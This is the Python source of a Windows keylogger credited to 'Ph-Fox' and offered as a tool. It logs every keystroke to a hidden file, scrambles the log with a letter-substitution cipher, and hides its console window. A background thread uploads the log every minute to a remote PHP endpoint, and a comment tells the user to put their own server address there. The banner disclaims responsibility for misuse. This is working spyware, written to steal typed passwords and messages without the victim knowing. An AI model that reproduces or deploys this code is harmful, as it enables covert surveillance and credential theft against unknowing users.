import requests, time, threading
from pynput import keyboard
import win32gui, win32con

dds = {'a':'z','b':'y','c':'x','d':'w','e':'v','f':'u','g':'t','h':'s','i':'r','j':'q','k':'p','l':'o','m':'n','n':'m','o':'l','p':'k','q':'j','r':'i','s':'h','t':'g','u':'f','v':'e','w':'d','x':'c','y':'b','z':'a',' ':' ','1':'0','2':'9','3':'8','4':'7','5':'6','6':'5','7':'4','8':'3','9':'2','0':'1'}

def ende(ui):
	msg_all = ''
	for charz in ui:
		try:
			if charz == charz.upper():
				x = dds.get(charz.lower())
				msg_all+=x.upper()
			else:
				x = dds.get(charz)
				msg_all+=x
		except:
			msg_all+=charz
	return msg_all

def upload():
	while True:
		url = 'http://example.com/logz/logger.php' # <------- Replace this with your website
		f = open('.logz.txt')
		logz = f.read()
		r = requests.post(url, data={'klogz':ende(logz)})
		f.close()
		time.sleep(60)

def save(key):
	f = open('.logz.txt','a')
	if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
		f.write(ende('<Ctrl> \n'))
	elif key == keyboard.Key.esc:
		f.write(ende('<Esc> \n'))
	elif key == keyboard.Key.space:
		f.write(' \n')
	elif key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
		f.write(ende('<Shift> \n'))
	elif key == keyboard.Key.backspace:
		f.write(ende('<Backspace> \n'))
	elif key == keyboard.Key.enter:
		f.write(ende('<Enter> \n'))
	elif key == keyboard.Key.tab:
		f.write(ende('<Tab> \n'))
	elif key == keyboard.Key.caps_lock:
		f.write(ende('<CapsLk> \n'))
	elif key == keyboard.Key.cmd:
		f.write(ende('<Cmd/Win> \n'))
	elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
		f.write(ende('<Alt> \n'))
	elif key == keyboard.Key.menu:
		f.write(ende('<menu> \n'))
	elif key == keyboard.Key.left:
		f.write(ende('<Left> \n'))
	elif key == keyboard.Key.right:
		f.write(ende('<Right> \n'))
	elif key == keyboard.Key.down:
		f.write(ende('<Down> \n'))
	elif key == keyboard.Key.up:
		f.write(ende('<Up> \n'))
	elif key == keyboard.Key.insert:
		f.write(ende('<Insert> \n'))
	elif key == keyboard.Key.delete:
		f.write(ende('<Del> \n'))
	elif key == keyboard.Key.home:
		f.write(ende('<Home> \n'))
	elif key == keyboard.Key.end:
		f.write(ende('<End> \n'))
	elif key == keyboard.Key.page_down:
		f.write(ende('<PageDown> \n'))
	elif key == keyboard.Key.page_up:
		f.write(ende('<PageUp> \n'))
	elif key == keyboard.Key.print_screen:
		f.write(ende('<PrintScreen> \n'))
	elif key == keyboard.Key.scroll_lock:
		f.write(ende('<ScrlLk> \n'))
	elif key == keyboard.Key.pause:
		f.write(ende('<Pause> \n'))
	elif key == keyboard.Key.num_lock:
		f.write(ende('<NumLk> \n'))
	elif key == keyboard.Key.f1:
		f.write(ende('<f1> \n'))
	elif key == keyboard.Key.f2:
		f.write(ende('<f2> \n'))
	elif key == keyboard.Key.f3:
		f.write(ende('<f3> \n'))
	elif key == keyboard.Key.f4:
		f.write(ende('<f4> \n'))
	elif key == keyboard.Key.f5:
		f.write(ende('<f5> \n'))
	elif key == keyboard.Key.f6:
		f.write(ende('<f6> \n'))
	elif key == keyboard.Key.f7:
		f.write(ende('<f7> \n'))
	elif key == keyboard.Key.f8:
		f.write(ende('<f8> \n'))
	elif key == keyboard.Key.f9:
		f.write(ende('<f9> \n'))
	elif key == keyboard.Key.f10:
		f.write(ende('<f10> \n'))
	elif key == keyboard.Key.f11:
		f.write(ende('<f11> \n'))
	elif key == keyboard.Key.f12:
		f.write(ende('<f12> \n'))
	else:
		f.write(ende(str(key)).replace("'",""))
	f.close()

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def on_release(key):
    print('{0} released'.format(key))
    save(key)
    if key == keyboard.Key.esc:
    	pass
        #return False


print("""
╔――――――――――――――――――――――――――――――――――――――――――――――╗
╟  ╔═╗┬ ┬ ╔═╗┌─┐─┐ ┬  ╦╔═   ╦  ┌─┐┌─┐┌─┐┌─┐┬─┐ ╢
╟  ╠═╝├─┤ ╠╣ │ │┌┴┬┘  ╠╩╗───║  │ ││ ┬│ ┬├┤ ├┬┘ ╢
╟  ╩  ┴ ┴o╚  └─┘┴ └─  ╩ ╩   ╩═╝└─┘└─┘└─┘└─┘┴└─ ╢
╟  By: Ph-Fox                                  ╢
╟ Note:                                        ╢
╟   I am no longer responsible                 ╢
╟   for any misuse of this tool.               ╢
╚――――――――――――――――――――――――――――――――――――――――――――――╝
""")

print("Starting..")
time.sleep(5)
winz = win32gui.GetForegroundWindow()
win32gui.ShowWindow(winz, win32con.SW_HIDE)
threading.Thread(target=upload).start()

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
	listener.join()

listener = keyboard.Listener(on_press=on_press,on_release=on_release)
listener.start()
